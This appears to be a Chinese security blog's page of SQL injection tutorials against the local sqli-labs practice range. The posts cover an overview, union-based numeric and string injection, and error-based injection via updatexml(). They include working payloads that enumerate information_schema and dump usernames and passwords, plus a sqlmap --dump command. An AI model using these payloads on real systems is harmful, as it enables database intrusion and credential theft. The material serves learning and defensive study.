<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://127.0.0.1/sqli/Less-8/?id=1&quot;</span> <span class="comment">--technique B -D security -T users </span></span><br><span class="line">-C <span class="built_in">id</span>,username,password <span class="comment">--dump</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210409212101436.png" alt="在这里插入图片描述"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/09/SQL%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/kilig.gif">
      <meta itemprop="name" content="kiligwh">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kilig's Blog">
      <meta itemprop="description" content="欢迎">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | kilig's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/11/09/SQL%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL注入-报错注入</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-11-09 17:17:08" itemprop="dateCreated datePublished" datetime="2022-11-09T17:17:08+08:00">2022-11-09</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-03-07 23:26:14" itemprop="dateModified" datetime="2023-03-07T23:26:14+08:00">2023-03-07</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="SQL注入-报错注入"><a href="#SQL注入-报错注入" class="headerlink" title="SQL注入-报错注入"></a>SQL注入-报错注入</h1><hr>
<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>当页面没有正确的返回错误信息时，就可以利用报错注入</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>利用数据库中的个别函数进行报错使用</p>
<h2 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h2><p>updatexml()</p>
<p>extractvalue()</p>
<blockquote>
<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2></blockquote>
<p>extractvalue() :对XML文档进行查询的函数</p>
<p>语法：extractvalue(目标xml文档，xml路径)</p>
<p>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p>
<p>extractvalue(456,concat(0x7e,version(),0x7e))</p>
<blockquote>
<h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2></blockquote>
<p>updatexml()：更新XML文档的函数</p>
<p>语法：updatexml(目标xml内容，xml文档路径，更新的内容)</p>
<p>updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)</p>
<p>实际上这里是去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了，但是报错的时候他其实已经执行了那个子查询代码</p>
<h2 id="其他所用函数"><a href="#其他所用函数" class="headerlink" title="其他所用函数"></a>其他所用函数</h2><p>concat() &#x3D;&#x3D;&gt;将多个字符串连接成一个字符串</p>
<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场<br><img src="https://img-blog.csdnimg.cn/20210408150559699.png" alt="在这里插入图片描述"><br>2、使用反斜杠\进行探测，报出错误信息<br><img src="https://img-blog.csdnimg.cn/20210408150633356.png" alt="在这里插入图片描述"></p>
<p>3、分析报错</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span><span class="number">1</span><span class="string">\&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; ==&gt;&#x27;</span><span class="number">1</span><span class="string">\&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span>  ==&gt;猜测变量由单引号包裹</span><br><span class="line">故构造payload  <span class="number">1</span><span class="string">&#x27; -- q</span></span><br></pre></td></tr></table></figure>

<p>4、写入payload，页面正常<br><img src="https://img-blog.csdnimg.cn/20210408150839219.png" alt="在这里插入图片描述"></p>
<p>5、得到字段数3，观察到页面没有回显点，但是有报错信息<br><img src="https://img-blog.csdnimg.cn/20210408150956944.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210408151013948.png" alt="在这里插入图片描述"></p>
<p>6、可利用updatexml()函数</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">构造payload：<span class="built_in">updatexml</span>(<span class="number">1</span>,<span class="built_in">concat</span>(<span class="number">0</span>x7e,<span class="built_in">version</span>(),<span class="number">0</span>x7e),<span class="number">1</span>)</span><br><span class="line">注意MySQL支持<span class="number">16</span>进制编码</span><br><span class="line">http:<span class="comment">//127.0.0.1/sqli/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,version(),0x7e),1)-- q</span></span><br><span class="line">得出版本号 <span class="number">5.0</span>以上</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210408151212291.png" alt="在这里插入图片描述"></p>
<p>7、利用MySQL自带数据库information_schema</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and</span><br><span class="line"> updatexml(1,concat(0x7e,(select table_name from information_schema.tables where </span><br><span class="line"> table_schema=database() limit 0,1),0x7e),1) -- q</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210408152319301.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210408152332281.png" alt="在这里插入图片描述"><br>8、查看users表中的字段名</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/sqli/Less-<span class="number">5</span>/?id=<span class="number">1</span>&#x27; and updatexml(<span class="number">1</span>,</span><br><span class="line"><span class="attribute">concat</span>(<span class="number">0</span>x7e,(select column_name from information_schema.columns where</span><br><span class="line"> <span class="attribute">table_schema</span>=database() and table_name=&#x27;users&#x27; limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0</span>x7e),<span class="number">1</span>) -- q</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210408152601678.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210408152622819.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210408152635212.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210408152645195.png" alt="在这里插入图片描述"><br>得出users表中有三个字段名：id、username、password</p>
<p>9、分别得出username和password 字段数据<br>第一个username字段数据Dumb<br><img src="https://img-blog.csdnimg.cn/20210408154022268.png" alt="在这里插入图片描述"><br>第一个password字段数据：Dumb<br><img src="https://img-blog.csdnimg.cn/20210408154059558.png" alt="在这里插入图片描述"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/08/SQL%E6%B3%A8%E5%85%A5%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5-%E5%AD%97%E7%AC%A6%E5%9E%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/kilig.gif">
      <meta itemprop="name" content="kiligwh">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kilig's Blog">
      <meta itemprop="description" content="欢迎">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | kilig's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/11/08/SQL%E6%B3%A8%E5%85%A5%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5-%E5%AD%97%E7%AC%A6%E5%9E%8B/" class="post-title-link" itemprop="url">SQL注入-联合注入【字符型】</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-11-08 16:15:40" itemprop="dateCreated datePublished" datetime="2022-11-08T16:15:40+08:00">2022-11-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-03-07 23:28:34" itemprop="dateModified" datetime="2023-03-07T23:28:34+08:00">2023-03-07</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="SQL注入-联合注入【字符型】"><a href="#SQL注入-联合注入【字符型】" class="headerlink" title="SQL注入-联合注入【字符型】"></a>SQL注入-联合注入【字符型】</h1><hr>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><blockquote>
<p><strong>注入的本质</strong></p>
</blockquote>
<p>用户输入的数据被当做代码执行</p>
<blockquote>
<p><strong>注入条件</strong></p>
</blockquote>
<p>用户可以控制传参</p>
<p>用户输入的语句被带入数据库并执行</p>
<blockquote>
<p><strong>显错注入原理</strong></p>
</blockquote>
<p>用户输入的数据被当做SQL语句执行，并带入数据库执行</p>
<p>对用户输入的数据没有做任何过滤，并且将结果返回到页面</p>
<p>没有做任何防护</p>
<blockquote>
<p><strong>注入的关键操作</strong></p>
</blockquote>
<p>构造闭合</p>
<blockquote>
<h2 id="注入基础"><a href="#注入基础" class="headerlink" title="注入基础"></a>注入基础</h2></blockquote>
<p>MySQL注释符：# 或 –空格 或 &#x2F;***&#x2F;<br>内联注释：&#x2F;**! SQL语句 *&#x2F; 只有MySQL可以识别，常用来绕过WAF<br>注入探测符：常使用 \ 进行探测</p>
<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、靶场<br><img src="https://img-blog.csdnimg.cn/20210408142344574.png" alt="在这里插入图片描述"><br>2、根据前面的数学型注入，可先使用and 1&#x3D;2 探测<br><img src="https://img-blog.csdnimg.cn/20210408142446753.png" alt="在这里插入图片描述"><br>页面无反应</p>
<p>3、使用探测符号\</p>
<p><img src="https://img-blog.csdnimg.cn/20210408142543703.png" alt="在这里插入图片描述"></p>
<p>4、根据报错信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>1\<span class="string">&#x27; LIMIT 0,1&#x27;</span> ==&gt; <span class="string">&#x27;1\&#x27;</span> LIMIT 0,1 （反斜杠通常为转义符）==&gt;可猜测变量<span class="built_in">id</span>由单引号字符围绕</span><br><span class="line">构造payload： <span class="built_in">id</span>=1<span class="string">&#x27; -- q （--空格 为MySQL的注释符）</span></span><br></pre></td></tr></table></figure>

<p>5、查看后端源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>添加构造的payload后：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;1&#x27;-- q&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>6、将payload写入到靶场中，页面正常<br><img src="https://img-blog.csdnimg.cn/2021040814314597.png" alt="靶场"></p>
<p>7、使用oder by 探测字段数<br><img src="https://img-blog.csdnimg.cn/20210408143335527.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2021040814335354.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210408143407330.png" alt="在这里插入图片描述"><br>8、探测字段数为3，使用联合查询，观察回显点<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-1/?id=0">http://127.0.0.1/sqli/Less-1/?id=0</a>‘ union select 1,2,3 – q<br><img src="https://img-blog.csdnimg.cn/20210408143911574.png" alt="在这里插入图片描述"><br>9、探测版本号和当前数据库名<br><img src="https://img-blog.csdnimg.cn/202104081440130.png" alt="在这里插入图片描述"><br>10、利用MySQL自带数据库information_schema得出数据</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">0</span>&#x27; union select <span class="number">1</span>,version(),group_concat(table_name) </span><br><span class="line"><span class="attribute">from</span> information_schema.tables where table_schema=database() -- q</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210408144225801.png" alt="在这里插入图片描述"><br>11、查看users数据表中的字段名</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?id=0&#x27; union <span class="keyword">select</span> <span class="number">1</span>,version(),group_concat(column_name)</span><br><span class="line"> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">&#x27;users&#x27;</span> -- q</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210408144440142.png" alt="在这里插入图片描述"><br>12、查询username、password字段信息，使用limit 依次查看</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">0</span>&#x27; union select <span class="number">1</span>,username,password from users limit <span class="number">3</span>,<span class="number">1</span> -- q</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210408144636820.png" alt="在这里插入图片描述"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>字符型注入与数字型注入的区别为 有无包裹变量的符号不同<br>以下几种包裹方式注入，与‘$id’ 注入同理</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=“<span class="subst">$id</span>” LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(“<span class="subst">$id</span>”) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>注入的关键在于 <strong>构造闭合</strong></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/08/SQL%E6%B3%A8%E5%85%A5%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5-%E6%95%B0%E5%AD%97%E5%9E%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/kilig.gif">
      <meta itemprop="name" content="kiligwh">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kilig's Blog">
      <meta itemprop="description" content="欢迎">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | kilig's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/11/08/SQL%E6%B3%A8%E5%85%A5%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5-%E6%95%B0%E5%AD%97%E5%9E%8B/" class="post-title-link" itemprop="url">SQL注入-联合注入【数字型】</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-11-08 13:50:04" itemprop="dateCreated datePublished" datetime="2022-11-08T13:50:04+08:00">2022-11-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-03-07 23:28:21" itemprop="dateModified" datetime="2023-03-07T23:28:21+08:00">2023-03-07</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="SQL注入-联合注入【数字型】"><a href="#SQL注入-联合注入【数字型】" class="headerlink" title="SQL注入-联合注入【数字型】"></a>SQL注入-联合注入【数字型】</h1><hr>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><blockquote>
<p><strong>注入的本质</strong></p>
</blockquote>
<p>用户输入的数据被当做代码执行</p>
<blockquote>
<p><strong>注入条件</strong></p>
</blockquote>
<p>用户可以控制传参</p>
<p>用户输入的语句被带入数据库并执行</p>
<blockquote>
<p><strong>显错注入原理</strong></p>
</blockquote>
<p>用户输入的数据被当做SQL语句执行，并带入数据库执行</p>
<p>对用户输入的数据没有做任何过滤，并且将结果返回到页面</p>
<h2 id="注入基础"><a href="#注入基础" class="headerlink" title="注入基础"></a>注入基础</h2><blockquote>
<p><strong>MySQL数据库基本认知</strong></p>
</blockquote>
<p>MYSQL5.0以上版本，将自带information_schema数据库<br>information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等 。<br>该数据库中有两张表tables和columns</p>
<p>TABLES：提供了关于数据库中的表的信息，详细表述了某个表属于哪个schema，<br>表类型，表引擎，创建时间等信息。tables表中 table_name字段表示 表的名字，<br>table_schema 字段表示数据库名（数据表所属的数据库名）</p>
<p>COLUMNS：提供了表中的列信息，详细表述了某张表的所有列以及每个列的信息，某个列属于哪个表。<br>columns表中table_schema字段为数据库名，table_name字段为表的名字，column_name字段为列的名字</p>
<ul>
<li>information_schema.tables 存放表名和库名的对应</li>
<li>information_schema.columns 存放字段名和表名的对应</li>
</ul>
<blockquote>
<p><strong>显错注入所用函数</strong></p>
</blockquote>
<p>order by –&gt;对字段进行排序<br>group_concat() –&gt;将字符连接起来，输出字符串集合，逗号分开<br>limit start end 限制select的输出数量<br>database() –&gt;当前所用数据库名<br>version() –&gt;数据库版本号<br>user() –&gt;用户名</p>
<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场<br><img src="https://img-blog.csdnimg.cn/20210408110142919.png" alt="在这里插入图片描述"><br>2 、将id&#x3D;1处1改为2<br><img src="https://img-blog.csdnimg.cn/20210408110218951.png" alt="在这里插入图片描述"></p>
<p>3、轻松得知：该页面是通过id进行传参，通过改变id的值页面返回不同的内容<br>4、分别使用and 1&#x3D;1 和and 1&#x3D;2 进行探测<br><img src="https://img-blog.csdnimg.cn/20210408110254245.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210408110307215.png" alt="在这里插入图片描述"><br>5、观察页面发生了变化，使用order by 判断字段数 [一般通过二分法判断]<br><img src="https://img-blog.csdnimg.cn/20210408110416210.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210408110449477.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210408110509135.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210408110520351.png" alt="在这里插入图片描述"><br>6、得知字段数为3，使用联合查询</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">UNION</span> 操作符用于连接两个以上的 <span class="built_in">SELECT</span> 语句的结果组合到一个结果集合中。</span><br><span class="line">多个 <span class="built_in">SELECT</span> 语句会删除重复的数据</span><br></pre></td></tr></table></figure>

<p>0 union select 1,2,3<br>观察回显点<br><img src="https://img-blog.csdnimg.cn/20210408110943523.png" alt="在这里插入图片描述"><br>7、回显点2,3，使用version()和database() 获得版本号和当前数据库的名称<br><img src="https://img-blog.csdnimg.cn/20210408111316475.png" alt="在这里插入图片描述"><br>8、得知MySQL版本号为5.0以上版本，所以可以使用MySQL自带数据库information_schema中的table和column表爆出数据<br>9、使用group_concat 爆出当前数据库下的所有表名<br><img src="https://img-blog.csdnimg.cn/2021040811211494.png" alt="在这里插入图片描述"><br>10、查询users表下的所有字段<br><img src="https://img-blog.csdnimg.cn/20210408133057977.png" alt="在这里插入图片描述"></p>
<p>11、查看user和password字段信息</p>
<p>第一种方法：使用limit 依次得出信息<br><img src="https://img-blog.csdnimg.cn/20210408133338331.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20210408133349582.png" alt="在这里插入图片描述"><br>第二种：使用group_concat()得出信息<br><img src="https://img-blog.csdnimg.cn/20210408133500166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="后端代码"><a href="#后端代码" class="headerlink" title="后端代码"></a>后端代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>接收id变量的传参，将id的传参值带入数据库进行查询</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/07/SQL%E6%B3%A8%E5%85%A5%E6%A6%82%E8%BF%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/kilig.gif">
      <meta itemprop="name" content="kiligwh">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kilig's Blog">
      <meta itemprop="description" content="欢迎">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | kilig's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/11/07/SQL%E6%B3%A8%E5%85%A5%E6%A6%82%E8%BF%B0/" class="post-title-link" itemprop="url">SQL注入概述</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-11-07 16:11:40" itemprop="dateCreated datePublished" datetime="2022-11-07T16:11:40+08:00">2022-11-07</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-03-07 21:29:03" itemprop="dateModified" datetime="2023-03-07T21:29:03+08:00">2023-03-07</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="SQL注入概述"><a href="#SQL注入概述" class="headerlink" title="SQL注入概述"></a>SQL注入概述</h1><hr>
<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p>SQL（Structured Query Language） – 结构化查询语句</p>
<p>用途：用于存取数据以及查询、更新和管理<strong>关系数据库系统</strong></p>
<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>SQL注入是服务器端<strong>未严格校验</strong>客户端发送的数据，而导致服务器端SQL语句被<strong>恶意修改</strong>并<strong>成功执行</strong>的行为</p>
<p><strong>本质：把用户输入的数据当作代码执行</strong></p>
<h2 id="注入产生原因"><a href="#注入产生原因" class="headerlink" title="注入产生原因"></a>注入产生原因</h2><p>代码对带入SQL语句的参数过滤不严格</p>
<p>未启用框架的安全配置。例如：PHP的magic_quotes_gpc</p>
<p>未使用框架安全的查询方法</p>
<p>测试接口未删除</p>
<p>未启用防火墙</p>
<p>未使用其他的安全防护设备</p>
<h2 id="注入条件"><a href="#注入条件" class="headerlink" title="注入条件"></a>注入条件</h2><p>用户可以控制传参</p>
<p>用户输入的语句被带入数据库进行查询</p>
<h2 id="业务场景"><a href="#业务场景" class="headerlink" title="业务场景"></a>业务场景</h2><p>登录功能</p>
<p>搜索功能</p>
<p>详情页</p>
<p>商品购买</p>
<p>……</p>
<p><strong>任何和数据库产生交互的地方都有可能存在注入</strong></p>
<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>数据库信息泄露：脱库</p>
<p>网页篡改：通过操作数据库对特定网页进行篡改</p>
<p>网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击</p>
<p>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员账号被篡改</p>
<p>服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统</p>
<h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><blockquote>
<p><strong>按照HTTP请求方法分类</strong></p>
</blockquote>
<p>GET型注入</p>
<p>POST型注入</p>
<blockquote>
<p><strong>按照SQL数据类型分类</strong></p>
</blockquote>
<p>整型注入</p>
<p>字符型注入</p>
<blockquote>
<p><strong>其他类型分类</strong></p>
</blockquote>
<p>报错注入</p>
<p>双注入</p>
<p>盲注（布尔盲注、时间盲注）</p>
<p>Cookie注入</p>
<p>User-Agent注入</p>
<p>……</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
